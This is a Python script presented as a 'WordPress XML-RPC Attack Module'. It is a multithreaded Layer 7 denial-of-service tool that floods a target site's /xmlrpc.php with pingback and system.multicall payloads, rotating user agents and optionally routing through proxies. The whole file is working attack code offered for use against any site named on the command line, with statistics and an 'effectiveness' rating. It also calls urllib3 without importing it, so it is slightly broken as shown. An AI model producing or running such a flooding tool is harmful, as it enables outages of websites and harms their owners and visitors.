#!/usr/bin/env python3
"""
WordPress XML-RPC Attack Module
Method: Layer 7 WordPress XML-RPC Pingback/DDOS
Author: AXMods
"""

import requests
import random
import time
import threading
import concurrent.futures
import xml.etree.ElementTree as ET
import sys
import os

# Add parent directory to path for imports
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from utils import get_random_user_agent, print_status, generate_random_string
from config import USER_AGENTS, HEADERS_TEMPLATE, TIMEOUT
from colorama import Fore, init

init(autoreset=True)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class WordPressXMLRPC:
    def __init__(self, target, port=80, threads=200, duration=60, use_https=False, proxy=None):
        """
        Initialize WordPress XML-RPC Attack
        
        Args:
            target (str): Target WordPress site URL
            port (int): Target port
            threads (int): Number of concurrent threads
            duration (int): Attack duration in seconds
            use_https (bool): Use HTTPS instead of HTTP
            proxy (dict): Optional proxy configuration
        """
        # Clean target input
        self.target = target.strip()
        if not self.target.startswith(('http://', 'https://')):
            self.target = f"{'https' if use_https else 'http'}://{self.target}"
        
        # Remove trailing slash for consistency
        self.target = self.target.rstrip('/')
        self.port = port
        self.threads = threads
        self.duration = duration
        self.use_https = use_https
        self.proxy = proxy
        self.is_attacking = False
        
        # Statistics
        self.request_count = 0
        self.pingback_count = 0
        self.multicall_count = 0
        self.error_count = 0
        self.start_time = None
        
        # XML-RPC endpoints
        self.xmlrpc_endpoint = "/xmlrpc.php"
        
        # List of XML-RPC methods to exploit
        self.methods = [
            'system.multicall',
            'pingback.ping',
            'wp.getUsersBlogs',
            'wp.getPage',
            'wp.getPages',
            'wp.getPosts',
            'wp.getTags',
            'wp.getCategories'
        ]
        
        # List of fake source URLs for pingback
        self.fake_sources = [
            'https://wordpress.org',
            'https://github.com',
            'https://stackoverflow.com',
            'https://www.google.com',
            'https://www.youtube.com',
            'https://www.facebook.com',
            'https://www.twitter.com',
            'https://www.instagram.com'
        ]
        
    def _generate_pingback_payload(self):
        """Generate XML-RPC pingback payload"""
        source_url = random.choice(self.fake_sources)
        target_url = self.target + '/' + generate_random_string(8)
        
        payload = f"""<?xml version="1.0" encoding="UTF-8"?>
<methodCall>
    <methodName>pingback.ping</methodName>
    <params>
        <param>
            <value><string>{source_url}</string></value>
        </param>
        <param>
            <value><string>{target_url}</string></value>
        </param>
    </params>
</methodCall>"""
        
        return payload
    
    def _generate_multicall_payload(self):
        """Generate XML-RPC multicall payload (multiple methods in one request)"""
        calls = []
        num_calls = random.randint(10, 50)  # Multiple method calls in one request
        
        for _ in range(num_calls):
            method = random.choice(self.methods)
            if method == 'pingback.ping':
                source_url = random.choice(self.fake_sources)
                target_url = self.target + '/' + generate_random_string(8)
                params = f"""
                <param>
                    <value><string>{source_url}</string></value>
                </param>
                <param>
                    <value><string>{target_url}</string></value>
                </param>"""
            else:
                # For other methods, use random parameters
                params = ""
                for _ in range(random.randint(1, 3)):
                    params += f"""
                <param>
                    <value><string>{generate_random_string(5)}</string></value>
                </param>"""
            
            call = f"""
            <value>
                <struct>
                    <member>
                        <name>methodName</name>
                        <value><string>{method}</string></value>
                    </member>
                    <member>
                        <name>params</name>
                        <value>
                            <array>
                                <data>{params}
                                </data>
                            </array>
                        </value>
                    </member>
                </struct>
            </value>"""
            calls.append(call)
        
        calls_xml = "\n".join(calls)
        
        payload = f"""<?xml version="1.0" encoding="UTF-8"?>
<methodCall>
    <methodName>system.multicall</methodName>
    <params>
        <param>
            <value>
                <array>
                    <data>
{calls_xml}
                    </data>
                </array>
            </value>
        </param>
    </params>
</methodCall>"""
        
        return payload
    
    def _generate_single_method_payload(self):
        """Generate payload for a single XML-RPC method"""
        method = random.choice(self.methods)
        
        if method == 'pingback.ping':
            return self._generate_pingback_payload()
        else:
            # For other methods, create a simple payload
            params = ""
            for _ in range(random.randint(1, 5)):
                params += f"""
        <param>
            <value><string>{generate_random_string(8)}</string></value>
        </param>"""
            
            payload = f"""<?xml version="1.0" encoding="UTF-8"?>
<methodCall>
    <methodName>{method}</methodName>
    <params>{params}
    </params>
</methodCall>"""
            
            return payload
    
    def _send_xmlrpc_request(self, payload):
        """Send XML-RPC request"""
        try:
            headers = HEADERS_TEMPLATE.copy()
            headers['User-Agent'] = get_random_user_agent()
            headers['Content-Type'] = 'text/xml'
            
            url = self.target + self.xmlrpc_endpoint
            
            response = requests.post(
                url,
                data=payload,
                headers=headers,
                timeout=TIMEOUT,
                verify=False,
                proxies=self.proxy
            )
            
            self.request_count += 1
            
            # Determine the type of request
            if 'pingback.ping' in payload:
                self.pingback_count += 1
            if 'system.multicall' in payload:
                self.multicall_count += 1
            
            # Log every 20th request
            if self.request_count % 20 == 0:
                print_status(
                    f"Requests: {self.request_count:,} | "
                    f"Pingbacks: {self.pingback_count:,} | "
                    f"Multicalls: {self.multicall_count:,}",
                    Fore.CYAN
                )
            
            return True
            
        except requests.exceptions.Timeout:
            self.error_count += 1
            return False
        except requests.exceptions.ConnectionError:
            self.error_count += 1
            return False
        except Exception as e:
            self.error_count += 1
            return False
    
    def _attack_worker(self):
        """Worker thread for sending XML-RPC requests"""
        while self.is_attacking:
            # Choose payload type
            choice = random.random()
            if choice < 0.4:  # 40% multicall
                payload = self._generate_multicall_payload()
            elif choice < 0.8:  # 40% pingback
                payload = self._generate_pingback_payload()
            else:  # 20% other methods
                payload = self._generate_single_method_payload()
            
            self._send_xmlrpc_request(payload)
            
            # Small random delay
            time.sleep(random.uniform(0.05, 0.2))
    
    def _stats_monitor(self):
        """Monitor and display attack statistics"""
        self.start_time = time.time()
        
        while self.is_attacking:
            elapsed = time.time() - self.start_time
            if elapsed > 0:
                rps = self.request_count / elapsed
                
                stats = (
                    f"Requests: {self.request_count:,} | "
                    f"RPS: {rps:.1f} | "
                    f"Pingbacks: {self.pingback_count:,} | "
                    f"Multicalls: {self.multicall_count:,} | "
                    f"Errors: {self.error_count:,} | "
                    f"Elapsed: {elapsed:.1f}s"
                )
                
                print_status(stats, Fore.YELLOW)
            
            time.sleep(2)
    
    def _endpoint_checker(self):
        """Check if XML-RPC endpoint is available"""
        check_interval = 30
        
        while self.is_attacking:
            time.sleep(check_interval)
            
            try:
                test_response = requests.get(
                    self.target + self.xmlrpc_endpoint,
                    timeout=5,
                    verify=False
                )
                
                if test_response.status_code == 405:  # Method Not Allowed (typical for XML-RPC)
                    print_status("XML-RPC endpoint responding (405 Method Not Allowed)", Fore.GREEN)
                elif test_response.status_code == 200:
                    print_status("XML-RPC endpoint responding (200 OK)", Fore.GREEN)
                else:
                    print_status(f"XML-RPC endpoint status: {test_response.status_code}", Fore.YELLOW)
                    
            except Exception as e:
                print_status(f"XML-RPC endpoint check failed: {str(e)[:50]}", Fore.RED)
    
    def start(self, focus_pingback=False):
        """
        Start WordPress XML-RPC attack
        
        Args:
            focus_pingback (bool): If True, focus more on pingback attacks
        """
        mode = "PINGBACK FOCUS" if focus_pingback else "MIXED"
        print_status(f"Starting WORDPRESS XML-RPC attack ({mode})...", Fore.RED)
        print_status(f"Target: {self.target}", Fore.WHITE)
        print_status(f"Threads: {self.threads}", Fore.WHITE)
        print_status(f"Duration: {self.duration} seconds", Fore.WHITE)
        print_status(f"XML-RPC Endpoint: {self.xmlrpc_endpoint}", Fore.WHITE)
        print_status("-" * 50, Fore.WHITE)
        
        # First, check if XML-RPC is enabled
        print_status("Checking XML-RPC endpoint...", Fore.CYAN)
        try:
            check = requests.get(self.target + self.xmlrpc_endpoint, timeout=10, verify=False)
            if check.status_code not in [200, 405]:
                print_status(f"Warning: XML-RPC might not be enabled (HTTP {check.status_code})", Fore.YELLOW)
            else:
                print_status("XML-RPC endpoint found and responsive", Fore.GREEN)
        except Exception as e:
            print_status(f"Warning: Cannot reach XML-RPC endpoint: {str(e)[:50]}", Fore.YELLOW)
        
        if focus_pingback:
            # Increase pingback ratio
            self.methods = ['pingback.ping'] * 5 + ['system.multicall'] * 2 + self.methods
            print_status("Pingback focus enabled: Higher ratio of pingback requests", Fore.RED)
        
        self.is_attacking = True
        self.request_count = 0
        self.pingback_count = 0
        self.multicall_count = 0
        self.error_count = 0
        
        # Start statistics monitor
        stats_thread = threading.Thread(target=self._stats_monitor, daemon=True)
        stats_thread.start()
        
        # Start endpoint checker
        endpoint_thread = threading.Thread(target=self._endpoint_checker, daemon=True)
        endpoint_thread.start()
        
        # Start attack threads
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = []
            
            # Submit worker threads
            for _ in range(self.threads):
                future = executor.submit(self._attack_worker)
                futures.append(future)
            
            # Run for specified duration
            time.sleep(self.duration)
            
            # Stop attack
            self.is_attacking = False
            
            # Wait for threads to complete
            concurrent.futures.wait(futures, timeout=5)
        
        # Final statistics
        elapsed = time.time() - self.start_time
        total_requests = self.request_count
        total_errors = self.error_count
        success_rate = ((total_requests - total_errors) / total_requests * 100) if total_requests > 0 else 0
        
        print_status("-" * 50, Fore.WHITE)
        print_status("WORDPRESS XML-RPC ATTACK COMPLETED", Fore.RED)
        print_status(f"Total Requests: {total_requests:,}", Fore.GREEN)
        print_status(f"Pingback Requests: {self.pingback_count:,}", Fore.YELLOW)
        print_status(f"Multicall Requests: {self.multicall_count:,}", Fore.CYAN)
        print_status(f"Success Rate: {success_rate:.1f}%", Fore.MAGENTA)
        print_status(f"Average RPS: {total_requests/elapsed:.1f}", Fore.WHITE)
        print_status(f"Total Duration: {elapsed:.1f} seconds", Fore.WHITE)
        
        # Effectiveness assessment
        if self.pingback_count > 0 and self.multicall_count > 0:
            effectiveness = "HIGH"
        elif self.pingback_count > 0 or self.multicall_count > 0:
            effectiveness = "MEDIUM"
        else:
            effectiveness = "LOW"
        
        print_status(f"Attack Effectiveness: {effectiveness}", 
                     Fore.GREEN if effectiveness == "HIGH" else Fore.YELLOW if effectiveness == "MEDIUM" else Fore.RED)
        
        return {
            'total_requests': total_requests,
            'pingback_requests': self.pingback_count,
            'multicall_requests': self.multicall_count,
            'error_count': total_errors,
            'success_rate': success_rate,
            'average_rps': total_requests/elapsed,
            'duration': elapsed,
            'effectiveness': effectiveness
        }

# Standalone test function
if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description="WordPress XML-RPC Attack Module")
    parser.add_argument("target", help="Target WordPress site URL")
    parser.add_argument("-p", "--port", type=int, default=80, help="Target port")
    parser.add_argument("-t", "--threads", type=int, default=50, help="Number of threads")
    parser.add_argument("-d", "--duration", type=int, default=30, help="Attack duration in seconds")
    parser.add_argument("-s", "--https", action="store_true", help="Use HTTPS")
    parser.add_argument("--pingback", action="store_true", help="Focus on pingback attacks")
    
    args = parser.parse_args()
    
    print(f"[*] Starting WordPress XML-RPC test against {args.target}")
    print(f"[*] Threads: {args.threads}")
    print(f"[*] Duration: {args.duration}s")
    print(f"[*] HTTPS: {args.https}")
    print(f"[*] Pingback Focus: {args.pingback}")
    print("-" * 50)
    
    attack = WordPressXMLRPC(
        target=args.target,
        port=args.port,
        threads=args.threads,
        duration=args.duration,
        use_https=args.https
    )
    
    try:
        results = attack.start(focus_pingback=args.pingback)
        print(f"\n[+] Attack completed successfully!")
        print(f"Effectiveness: {results['effectiveness']}")
    except KeyboardInterrupt:
        print(f"\n[!] Attack interrupted by user")
    except Exception as e:
        print(f"\n[!] Error: {e}")
        import traceback
        traceback.print_exc()
